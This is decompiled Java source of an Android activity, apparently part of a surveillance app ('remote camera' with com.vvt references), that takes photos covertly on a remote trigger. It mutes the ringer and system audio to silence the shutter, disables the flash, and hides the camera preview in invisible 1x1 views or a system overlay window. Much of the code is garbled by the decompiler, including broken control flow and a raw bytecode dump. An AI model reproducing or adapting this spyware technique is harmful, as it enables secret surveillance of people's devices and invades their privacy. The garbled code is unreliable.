package com.remote.camera.normal;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.hardware.Camera;
import android.hardware.Camera.CameraInfo;
import android.hardware.Camera.Parameters;
import android.hardware.Camera.PictureCallback;
import android.hardware.Camera.Size;
import android.media.AudioManager;
import android.os.Bundle;
import android.os.ConditionVariable;
import android.os.Handler;
import android.os.SystemClock;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import android.view.ViewGroup.LayoutParams;
import android.view.Window;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import java.util.Iterator;
import java.util.List;

public class RemoteCameraActivity
  extends Activity
{
  private static final boolean c = com.vvt.ak.a.a;
  private static final boolean d = com.vvt.ak.a.e;
  public ConditionVariable a;
  i b;
  private Camera e;
  private a f;
  private String g;
  private AudioManager h;
  private WindowManager i;
  private Handler j;
  private Handler k;
  private Runnable l;
  private Runnable m;
  private Bundle n;
  private int o = -1;
  private int p = 0;
  private int q = 2;
  private Camera.PictureCallback r;
  
  public RemoteCameraActivity()
  {
    h localh = new com/remote/camera/normal/h;
    localh.<init>(this);
    this.r = localh;
  }
  
  private int a(int paramInt)
  {
    int i1 = -1;
    int i2 = Camera.getNumberOfCameras();
    int i3 = 0;
    if (i3 < i2)
    {
      Camera.CameraInfo localCameraInfo = new android/hardware/Camera$CameraInfo;
      localCameraInfo.<init>();
      Camera.getCameraInfo(i3, localCameraInfo);
      int i4 = localCameraInfo.facing;
      if (i4 != paramInt) {}
    }
    for (;;)
    {
      return i3;
      i3 += 1;
      break;
      i3 = i1;
    }
  }
  
  private Camera.Size a(int paramInt, Camera.Parameters paramParameters)
  {
    Object localObject1 = null;
    Object localObject2 = paramParameters.getSupportedPreviewSizes();
    Iterator localIterator = ((List)localObject2).iterator();
    boolean bool = localIterator.hasNext();
    if (bool)
    {
      localObject2 = (Camera.Size)localIterator.next();
      int i1 = ((Camera.Size)localObject2).width;
      if (i1 <= paramInt) {
        if (localObject1 != null) {}
      }
      for (;;)
      {
        localObject1 = localObject2;
        break;
        i1 = ((Camera.Size)localObject1).width;
        int i2 = ((Camera.Size)localObject1).height;
        i1 *= i2;
        i2 = ((Camera.Size)localObject2).width;
        int i3 = ((Camera.Size)localObject2).height;
        i2 *= i3;
        if (i2 <= i1) {
          localObject2 = localObject1;
        }
      }
    }
    return (Camera.Size)localObject1;
  }
  
  private void a(String paramString, int paramInt)
  {
    this.g = paramString;
    this.o = paramInt;
    boolean bool = c();
    if (!bool)
    {
      bool = c;
      if (bool) {}
      bool = d();
      if (!bool)
      {
        bool = c;
        if (bool) {}
        bool = e();
        if (!bool)
        {
          bool = c;
          if (bool) {}
          f();
        }
      }
    }
    for (;;)
    {
      return;
      bool = c;
      if (!bool) {}
    }
  }
  
  private boolean c()
  {
    for (;;)
    {
      try
      {
        bool1 = g();
        if (!bool1) {
          continue;
        }
        Object localObject1 = new android/view/SurfaceView;
        Object localObject4 = getApplicationContext();
        ((SurfaceView)localObject1).<init>((Context)localObject4);
        localObject1 = ((SurfaceView)localObject1).getHolder();
        localObject4 = this.e;
        ((Camera)localObject4).setPreviewDisplay((SurfaceHolder)localObject1);
        localObject1 = this.e;
        localObject1 = ((Camera)localObject1).getParameters();
        int i1 = 700;
        localObject4 = a(i1, (Camera.Parameters)localObject1);
        int i2 = ((Camera.Size)localObject4).width;
        i1 = ((Camera.Size)localObject4).height;
        ((Camera.Parameters)localObject1).setPictureSize(i2, i1);
        localObject4 = "off";
        ((Camera.Parameters)localObject1).setFlashMode((String)localObject4);
        localObject4 = this.e;
        ((Camera)localObject4).setParameters((Camera.Parameters)localObject1);
        localObject1 = this.e;
        ((Camera)localObject1).startPreview();
        bool1 = c;
        if (bool1) {}
        localObject1 = this.e;
        i1 = 0;
        localObject4 = null;
        i2 = 0;
        Camera.PictureCallback localPictureCallback = this.r;
        ((Camera)localObject1).takePicture(null, null, localPictureCallback);
        bool1 = true;
      }
      finally
      {
        boolean bool2;
        boolean bool1 = d;
        if (!bool1) {
          continue;
        }
        bool1 = false;
        Object localObject3 = null;
        continue;
      }
      return bool1;
      bool2 = d;
      if (!bool2) {}
    }
  }
  
  private boolean d()
  {
    try
    {
      bool = g();
      if (bool)
      {
        Object localObject1 = this.e;
        localObject1 = ((Camera)localObject1).getParameters();
        int i1 = 700;
        Object localObject4 = a(i1, (Camera.Parameters)localObject1);
        int i2 = ((Camera.Size)localObject4).width;
        i1 = ((Camera.Size)localObject4).height;
        ((Camera.Parameters)localObject1).setPictureSize(i2, i1);
        localObject4 = "off";
        ((Camera.Parameters)localObject1).setFlashMode((String)localObject4);
        localObject4 = this.e;
        ((Camera)localObject4).setParameters((Camera.Parameters)localObject1);
        localObject1 = new android/view/SurfaceView;
        ((SurfaceView)localObject1).<init>(this);
        localObject4 = this.e;
        localObject1 = ((SurfaceView)localObject1).getHolder();
        ((Camera)localObject4).setPreviewDisplay((SurfaceHolder)localObject1);
        localObject1 = this.e;
        ((Camera)localObject1).startPreview();
        bool = c;
        if (bool) {}
        localObject1 = this.e;
        i1 = 0;
        localObject4 = null;
        i2 = 0;
        Camera.PictureCallback localPictureCallback = this.r;
        ((Camera)localObject1).takePicture(null, null, localPictureCallback);
        bool = true;
      }
    }
    finally
    {
      for (;;)
      {
        boolean bool = d;
        if (bool) {}
        bool = false;
        Object localObject3 = null;
      }
    }
    return bool;
  }
  
  /* Error */
  private boolean e()
  {
    // Byte code:
    //   0: aload_0
    //   1: invokespecial 128	com/remote/camera/normal/RemoteCameraActivity:FxFileObserverWorker	()Z
    //   4: istore_1
    //   5: iload_1
    //   6: ifeq +140 -> 146
    //   9: aload_0
    //   10: getfield 111	com/remote/camera/normal/RemoteCameraActivity:e	Landroid/hardware/Camera;
    //   13: astore_2
    //   14: new 179	android/graphics/SurfaceTexture
    //   17: astore_3
    //   18: iconst_0
    //   19: istore 4
    //   21: aconst_null
    //   22: astore 5
    //   24: aload_3
    //   25: iconst_0
    //   26: invokespecial 182	android/graphics/SurfaceTexture:<init>	(I)V
    //   29: aload_2
    //   30: aload_3
    //   31: invokevirtual 186	android/hardware/Camera:setPreviewTexture	(Landroid/graphics/SurfaceTexture;)V
    //   34: aload_0
    //   35: getfield 111	com/remote/camera/normal/RemoteCameraActivity:e	Landroid/hardware/Camera;
    //   38: astore_2
    //   39: aload_2
    //   40: invokevirtual 170	android/hardware/Camera:startPreview	()V
    //   43: aload_0
    //   44: getfield 111	com/remote/camera/normal/RemoteCameraActivity:e	Landroid/hardware/Camera;
    //   47: astore_2
    //   48: aload_2
    //   49: invokevirtual 149	android/hardware/Camera:getParameters	()Landroid/hardware/Camera$Parameters;
    //   52: astore_2
    //   53: sipush 700
    //   56: istore 6
    //   58: aload_0
    //   59: iload 6
    //   61: aload_2
    //   62: invokespecial 153	com/remote/camera/normal/RemoteCameraActivity:a	(ILandroid/hardware/Camera$Parameters;)Landroid/hardware/Camera$Size;
    //   65: astore_3
    //   66: ldc -97
    //   68: astore 5
    //   70: aload_2
    //   71: aload 5
    //   73: invokevirtual 163	android/hardware/Camera$Parameters:setFlashMode	(Ljava/lang/String;)V
    //   76: aload_3
    //   77: getfield 106	android/hardware/Camera$Size:width	I
    //   80: istore 4
    //   82: aload_3
    //   83: getfield 109	android/hardware/Camera$Size:height	I
    //   86: istore 6
    //   88: aload_2
    //   89: iload 4
    //   91: iload 6
    //   93: invokevirtual 157	android/hardware/Camera$Parameters:setPictureSize	(II)V
    //   96: aload_0
    //   97: getfield 111	com/remote/camera/normal/RemoteCameraActivity:e	Landroid/hardware/Camera;
    //   100: astore_3
    //   101: aload_3
    //   102: aload_2
    //   103: invokevirtual 167	android/hardware/Camera:setParameters	(Landroid/hardware/Camera$Parameters;)V
    //   106: getstatic 41	com/remote/camera/normal/RemoteCameraActivity:MyUncaughtExceptionHandler	Z
    //   109: istore_1
    //   110: iload_1
    //   111: ifeq +3 -> 114
    //   114: aload_0
    //   115: getfield 111	com/remote/camera/normal/RemoteCameraActivity:e	Landroid/hardware/Camera;
    //   118: astore_2
    //   119: iconst_0
    //   120: istore 6
    //   122: aconst_null
    //   123: astore_3
    //   124: iconst_0
    //   125: istore 4
    //   127: aconst_null
    //   128: astore 5
    //   130: aload_0
    //   131: getfield 63	com/remote/camera/normal/RemoteCameraActivity:r	Landroid/hardware/Camera$PictureCallback;
    //   134: astore 7
    //   136: aload_2
    //   137: aconst_null
    //   138: aconst_null
    //   139: aload 7
    //   141: invokevirtual 174	android/hardware/Camera:takePicture	(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V
    //   144: iconst_1
    //   145: istore_1
    //   146: iload_1
    //   147: ireturn
    //   148: astore_2
    //   149: getstatic 45	com/remote/camera/normal/RemoteCameraActivity:d	Z
    //   152: istore_1
    //   153: iload_1
    //   154: ifeq +3 -> 157
    //   157: iconst_0
    //   158: istore_1
    //   159: aconst_null
    //   160: astore_2
    //   161: goto -15 -> 146
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	164	0	this	RemoteCameraActivity
    //   4	155	1	bool	boolean
    //   13	124	2	localObject1	Object
    //   148	1	2	localObject2	Object
    //   160	1	2	localObject3	Object
    //   17	107	3	localObject4	Object
    //   19	107	4	i1	int
    //   22	107	5	str	String
    //   56	65	6	i2	int
    //   134	6	7	localPictureCallback	Camera.PictureCallback
    // Exception table:
    //   from	to	target	type
    //   0	4	148	finally
    //   9	13	148	finally
    //   14	17	148	finally
    //   25	29	148	finally
    //   30	34	148	finally
    //   34	38	148	finally
    //   39	43	148	finally
    //   43	47	148	finally
    //   48	52	148	finally
    //   61	65	148	finally
    //   71	76	148	finally
    //   76	80	148	finally
    //   82	86	148	finally
    //   91	96	148	finally
    //   96	100	148	finally
    //   102	106	148	finally
    //   106	109	148	finally
    //   114	118	148	finally
    //   130	134	148	finally
    //   139	144	148	finally
  }
  
  private void f()
  {
    for (;;)
    {
      try
      {
        bool = g();
        if (!bool) {
          continue;
        }
        localObject1 = this.e;
        localObject1 = ((Camera)localObject1).getParameters();
        i1 = 700;
        localObject3 = a(i1, (Camera.Parameters)localObject1);
        i2 = ((Camera.Size)localObject3).width;
        i1 = ((Camera.Size)localObject3).height;
        ((Camera.Parameters)localObject1).setPictureSize(i2, i1);
        localObject3 = "off";
        ((Camera.Parameters)localObject1).setFlashMode((String)localObject3);
        localObject3 = this.e;
        ((Camera)localObject3).setParameters((Camera.Parameters)localObject1);
        localObject1 = new com/remote/camera/normal/a;
        localObject3 = this.e;
        localObject4 = this.a;
        ((a)localObject1).<init>(this, (Camera)localObject3, (ConditionVariable)localObject4);
        this.f = ((a)localObject1);
        bool = com.vvt.aa.a.a();
        if (bool)
        {
          bool = c;
          if (bool) {}
          localObject1 = new android/view/ViewGroup$LayoutParams;
          i1 = 1;
          i2 = 1;
          ((ViewGroup.LayoutParams)localObject1).<init>(i1, i2);
          localObject3 = this.f;
          setContentView((View)localObject3, (ViewGroup.LayoutParams)localObject1);
          localObject1 = this.f;
          i1 = 0;
          localObject3 = null;
          ((a)localObject1).setZOrderOnTop(false);
          localObject1 = this.f;
          i1 = 0;
          localObject3 = null;
          ((a)localObject1).setBackgroundColor(0);
          localObject1 = new java/lang/Thread;
          localObject3 = new com/remote/camera/normal/f;
          ((f)localObject3).<init>(this);
          localObject4 = "RemCamT";
          ((Thread)localObject1).<init>((Runnable)localObject3, (String)localObject4);
          ((Thread)localObject1).start();
          return;
        }
      }
      finally
      {
        Object localObject1;
        int i1;
        Object localObject3;
        int i2;
        Object localObject4;
        int i3;
        int i4;
        int i5;
        boolean bool = d;
        if (!bool) {
          continue;
        }
        k();
        continue;
        bool = d;
        if (!bool) {
          continue;
        }
        continue;
      }
      localObject1 = "window";
      localObject1 = getSystemService((String)localObject1);
      localObject1 = (WindowManager)localObject1;
      this.i = ((WindowManager)localObject1);
      localObject1 = new android/view/WindowManager$LayoutParams;
      i1 = 1;
      i2 = 1;
      i3 = 2006;
      i4 = 262144;
      i5 = -3;
      ((WindowManager.LayoutParams)localObject1).<init>(i1, i2, i3, i4, i5);
      localObject3 = this.i;
      localObject4 = this.f;
      ((WindowManager)localObject3).addView((View)localObject4, (ViewGroup.LayoutParams)localObject1);
      localObject1 = this.f;
      i1 = 0;
      localObject3 = null;
      ((a)localObject1).setZOrderOnTop(false);
    }
  }
  
  private boolean g()
  {
    int i1 = 5;
    boolean bool1 = false;
    int i2 = i1;
    if ((i2 > 0) && (!bool1)) {
      for (;;)
      {
        try
        {
          h();
          int i3 = this.o;
          i3 = a(i3);
          if (i3 < 0) {
            continue;
          }
          Camera localCamera = Camera.open(i3);
          this.e = localCamera;
          boolean bool3 = com.vvt.aa.a.e();
          if (bool3)
          {
            localCamera = this.e;
            com.vvt.f.a.a(localCamera, i3);
          }
          bool1 = true;
        }
        finally
        {
          boolean bool2 = d;
          if (!bool2) {
            continue;
          }
          long l1 = 5000L;
          SystemClock.sleep(l1);
          continue;
        }
        bool2 = c;
        if (bool2) {}
        i2 += -1;
        break;
        bool2 = d;
        if (!bool2) {}
      }
    }
    return bool1;
  }
  
  private void h()
  {
    Camera localCamera = this.e;
    if (localCamera != null)
    {
      this.e.release();
      localCamera = null;
      this.e = null;
    }
  }
  
  private void i()
  {
    int i1 = 1;
    this.h.setRingerMode(0);
    this.h.setStreamMute(i1, i1);
  }
  
  private void j()
  {
    this.h.setStreamMute(1, false);
    AudioManager localAudioManager = this.h;
    int i1 = this.q;
    localAudioManager.setRingerMode(i1);
  }
  
  private void k()
  {
    b localb = i.b;
    if (localb != null)
    {
      localb = i.b;
      String str = "Cannot access the camera at this time. It may be in use by another application.";
      localb.a(str);
    }
    finish();
  }
  
  public void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    int i1 = 1;
    requestWindowFeature(i1);
    Object localObject1 = getWindow();
    int i2 = 1024;
    ((Window)localObject1).addFlags(i2);
    localObject1 = new android/os/ConditionVariable;
    ((ConditionVariable)localObject1).<init>(false);
    this.a = ((ConditionVariable)localObject1);
    localObject1 = getIntent().getExtras();
    this.n = ((Bundle)localObject1);
    localObject1 = this.n;
    boolean bool1;
    if (localObject1 != null)
    {
      localObject1 = (AudioManager)getApplicationContext().getSystemService("audio");
      this.h = ((AudioManager)localObject1);
      i1 = this.h.getRingerMode();
      this.q = i1;
      i();
      localObject1 = new android/os/Handler;
      ((Handler)localObject1).<init>();
      this.j = ((Handler)localObject1);
      localObject1 = new android/os/Handler;
      ((Handler)localObject1).<init>();
      this.k = ((Handler)localObject1);
      localObject1 = new com/remote/camera/normal/c;
      ((c)localObject1).<init>(this);
      this.m = ((Runnable)localObject1);
      localObject1 = new com/remote/camera/normal/d;
      ((d)localObject1).<init>(this);
      this.l = ((Runnable)localObject1);
      localObject1 = new com/remote/camera/normal/i;
      Object localObject2 = new com/remote/camera/normal/e;
      ((e)localObject2).<init>(this);
      ((i)localObject1).<init>((b)localObject2);
      this.b = ((i)localObject1);
      localObject1 = this.n;
      localObject2 = "path_back";
      bool1 = ((Bundle)localObject1).containsKey((String)localObject2);
      if (bool1)
      {
        localObject1 = this.n;
        localObject2 = "path_back";
        localObject1 = ((Bundle)localObject1).getString((String)localObject2);
        boolean bool2 = c;
        if (bool2) {}
        a((String)localObject1, 0);
        bool1 = c;
        if (bool1) {}
        bool1 = c;
        if (bool1) {}
        localObject1 = this.j;
        localObject2 = this.l;
        ((Handler)localObject1).postDelayed((Runnable)localObject2, 30000L);
        localObject1 = this.k;
        localObject2 = this.m;
        long l1 = 60000L;
        ((Handler)localObject1).postDelayed((Runnable)localObject2, l1);
      }
    }
    for (;;)
    {
      return;
      bool1 = d;
      if (bool1) {}
      finish();
      break;
      bool1 = d;
      if (bool1) {}
      finish();
    }
  }
  
  protected void onDestroy()
  {
    super.onDestroy();
    Object localObject = this.e;
    if (localObject != null)
    {
      localObject = this.e;
      ((Camera)localObject).release();
    }
    j();
    localObject = this.k;
    Runnable localRunnable = this.m;
    ((Handler)localObject).removeCallbacks(localRunnable);
    localObject = this.j;
    localRunnable = this.l;
    ((Handler)localObject).removeCallbacks(localRunnable);
    boolean bool = c;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/remote/camera/normal/RemoteCameraActivity.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */